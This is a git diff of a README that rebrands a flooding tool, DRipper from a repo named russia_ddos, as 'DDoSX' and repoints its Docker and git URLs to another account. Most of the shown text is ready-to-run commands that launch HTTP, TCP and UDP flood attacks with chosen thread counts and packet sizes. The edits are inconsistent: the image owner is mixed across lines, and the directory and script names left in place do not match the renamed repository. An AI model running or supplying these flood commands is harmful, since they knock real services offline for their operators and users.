@@ -1,4 +1,4 @@
-# DRipper
+# DDoSX
 
 [![Build status][actions build badge]][actions build link]
 [![Docker Pulls][docker pulls badge]][docker pulls link]
@@ -143,17 +143,17 @@ Example: dripper -t 100 -m tcp-flood -s tcp://192.168.0.1:80
 
 ```bash
 # HTTP flood
-docker run -it --rm alexmon1989/dripper:latest -t 100 -m http-flood -s http://127.0.0.1:80 
+docker run -it --rm alexmon1989/ddosx:latest -t 100 -m http-flood -s http://127.0.0.1:80 
 # or
-docker run -it --rm alexmon1989/dripper:latest -t 100 -s http://127.0.0.1:80
+docker run -it --rm alexmon1989/ddosx:latest -t 100 -s http://127.0.0.1:80
 # or even
-docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1
+docker run -it --rm alexmon1989/ddosx:latest -s http://127.0.0.1
 
 # TCP flood
-docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s tcp://127.0.0.1:80 
+docker run -it --rm alexmon1989/ddosx:latest -t 100 -l 2048 -s tcp://127.0.0.1:80 
 
 # UDP flood
-docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s udp://127.0.0.1:80 
+docker run -it --rm Alanz-Host/ddosx:latest -t 100 -l 2048 -s udp://127.0.0.1:80 
 ```
 
 #### Directly with Python.
@@ -161,11 +161,11 @@ docker run -it --rm alexmon1989/dripper:latest -t 100 -l 2048 -s udp://127.0.0.1
 Ensure you have Python 3.9 or better installed. Then clone this repo and run DRipper.py with params you need
 
 ```bash
-git clone https://github.com/alexmon1989/russia_ddos.git
+git clone https://github.com/Alanz-Host/DDoSX.git
 cd russia_ddos
 
 # Install dependencies
-python3 -m pip install --upgrade pip git+https://github.com/alexmon1989/russia_ddos.git
+python3 -m pip install --upgrade pip git+https://github.com/Alanz-Host/DDoSX.git
 # Run script
 dripper -t 100 -s udp://127.0.0.1:80
 
@@ -177,11 +177,6 @@ pip install -r requirements.txt
 # Run script
 python3 DRipper.py -t 100 -s udp://127.0.0.1:80
 ```
-
-#### Kubernetes
-
-You can deploy and run DRipper in Kubernetes cluster using [kube-dripper][kube-dripper-link] terraform configuration.
-For details - see the [README][kube-dripper-readme] from **kube-dripper** project.
 
 ## How to run unit tests
 
